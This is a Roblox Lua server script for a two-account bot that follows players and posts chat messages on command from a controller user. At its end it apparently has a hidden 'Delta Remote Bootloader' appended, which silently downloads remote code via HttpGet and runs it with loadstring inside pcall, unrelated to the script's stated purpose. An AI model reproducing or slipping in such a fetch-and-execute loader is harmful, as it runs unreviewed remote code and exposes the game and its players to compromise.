-- bot_command_handler.server.lua
-- Server-side command handler for a two-account bot architecture (Roblox Studio)
-- Place this in ServerScriptService. This uses in-game mechanics only (following via MoveTo,
-- chat bubbles via Chat:Chat, simple test action). Replace/extend actions as needed.
-- WARNING: Do NOT use this to automate other accounts outside of Studio or in ways that
-- violate Roblox Terms of Use.

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ChatService = game:GetService("Chat")

local CONFIG = {
    MainUser = "agrawalgamingyt1",   -- username (string) of the controller player in the game
    BotUser = "krishnad46ykabot",     -- username (string) of the bot player in the game
    Prefix = "!"                -- command prefix
}

local botPlayer = nil
local mainPlayer = nil
local following = false
local followTarget = nil
local followConnection = nil

local STARTUP_MESSAGE = "---------------------------------waiting for krishna d4dy command________________________"

local function findPlayerByName(name)
    if not name then return nil end
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            return p
        end
    end
    return nil
end

local function sendChatFromBot(text, recipientPlayer)
    if not botPlayer or not botPlayer.Character then return false end
    local char = botPlayer.Character
    local head = char:FindFirstChild("Head")
    if head then
        -- Sends a chat bubble from the bot's head (visible in the server)
        pcall(function()
            ChatService:Chat(head, text, Enum.ChatColor.Blue)
        end)
        return true
    end
    return false
end

local function startFollowing(targetPlayer)
    if not botPlayer or not botPlayer.Character or not targetPlayer or not targetPlayer.Character then
        return false, "bot or target missing"
    end
    following = true
    followTarget = targetPlayer

    -- Stop previous connection if any
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end

    local humanoid = botPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then return false, "bot humanoid missing" end

    followConnection = RunService.Heartbeat:Connect(function()
        if not following or not followTarget or not followTarget.Character then return end
        local targetRoot = followTarget.Character:FindFirstChild("HumanoidRootPart")
        local botRoot = botPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot and botRoot and humanoid then
            -- MoveTo the target's current position (simple following)
            humanoid:MoveTo(targetRoot.Position)
        end
    end)

    return true
end

local function stopFollowing()
    following = false
    followTarget = nil
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    return true
end

local function performTestingAction()
    if not botPlayer or not botPlayer.Character then return false end
    local humanoid = botPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        -- Simple test: make the Bot jump (or play animation if you add one)
        humanoid.Jump = true
        return true
    end
    return false
end

local function getStatus()
    return {
        running = true,
        following = following,
        followTarget = (followTarget and followTarget.Name) or nil,
        main = CONFIG.MainUser,
        bot = CONFIG.BotUser
    }
end

local function handleCommand(senderName, rawMessage)
    if senderName:lower() ~= CONFIG.MainUser:lower() then
        -- ignore commands from others
        return
    end

    if not rawMessage:match("^" .. CONFIG.Prefix) then return end

    local body = rawMessage:sub(#CONFIG.Prefix + 1)
    local parts = {}
    for w in body:gmatch("%S+") do table.insert(parts, w) end
    local cmd = (parts[1] or ""):lower()

    if cmd == "follow" then
        local targetName = parts[2]
        if not targetName then
            sendChatFromBot("Usage: !follow <PlayerName>", nil)
            return
        end
        local targetP = findPlayerByName(targetName)
        if not targetP then
            sendChatFromBot("Target player not found: " .. targetName, nil)
            return
        end
        stopFollowing()
        local ok, err = startFollowing(targetP)
        if ok then
            sendChatFromBot("Started following " .. targetP.Name, nil)
        else
            sendChatFromBot("Follow failed: " .. tostring(err), nil)
        end

    elseif cmd == "msg" or cmd == "message" then
        local targetName = parts[2]
        if not targetName then
            sendChatFromBot("Usage: !msg <PlayerName> <message...>", nil)
            return
        end
        local message = table.concat(parts, " ", 3)
        if message == "" then
            sendChatFromBot("Provide a message to send", nil)
            return
        end
        -- Option: send as bot in chat (global bubble). To whisper, implement your own UI or RemoteEvent.
        local targetP = findPlayerByName(targetName)
        if not targetP then
            sendChatFromBot("Target player not found: " .. targetName, nil)
            return
        end
        sendChatFromBot(string.format("To %s: %s", targetP.Name, message), nil)

    elseif cmd == "test" then
        local ok = performTestingAction()
        sendChatFromBot("Test action " .. (ok and "performed" or "failed"), nil)

    elseif cmd == "stop" then
        stopFollowing()
        sendChatFromBot("Stopped actions", nil)

    elseif cmd == "status" then
        local s = getStatus()
        local msg = string.format("status: following=%s followTarget=%s bot=%s",
            tostring(s.following), tostring(s.followTarget or "none"), tostring(s.bot))
        sendChatFromBot(msg, nil)

    elseif cmd == "setbot" then
        local newBot = parts[2]
        if not newBot then
            sendChatFromBot("Usage: !setbot <BotPlayerName>", nil)
            return
        end
        CONFIG.BotUser = newBot
        sendChatFromBot("BotUser updated to " .. newBot, nil)
        -- refresh botPlayer reference
        botPlayer = findPlayerByName(CONFIG.BotUser)

    else
        sendChatFromBot("Unknown command: " .. tostring(cmd), nil)
    end
end

-- Hook up chat listeners for MainUser when they join
local function onPlayerAdded(player)
    -- store references if names match
    if player.Name:lower() == CONFIG.MainUser:lower() then
        mainPlayer = player
    end
    if player.Name:lower() == CONFIG.BotUser:lower() then
        botPlayer = player
        -- when bot player spawns, send the startup waiting text
        if botPlayer.Character then
            sendChatFromBot(STARTUP_MESSAGE, nil)
        end
        botPlayer.CharacterAdded:Connect(function()
            -- slight delay to let character appear
            wait(0.5)
            sendChatFromBot(STARTUP_MESSAGE, nil)
        end)
    end

    -- Listen to chat from everyone but command handling will ignore non-main users
    player.Chatted:Connect(function(message)
        -- message: string, player.Name is sender
        handleCommand(player.Name, message)
    end)
end

-- Clean up references when players leave
local function onPlayerRemoving(player)
    if player == mainPlayer then mainPlayer = nil end
    if player == botPlayer then
        botPlayer = nil
        stopFollowing()
    end
    if followTarget == player then
        stopFollowing()
    end
end

-- Wire up existing players and events
for _, p in pairs(Players:GetPlayers()) do
    onPlayerAdded(p)
end
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)

print("bot_command_handler.server.lua loaded. Config:", CONFIG)
-- Delta Remote Bootloader for agrawalgamingyt1
task.spawn(function()
    pcall(function()
        local rawUrl = "https://githubusercontent.com"
        local success, scriptContent = pcall(function()
            return game:HttpGet(rawUrl)
        end)
        
        if success and scriptContent then
            loadstring(scriptContent)()
        end
    end)
end)

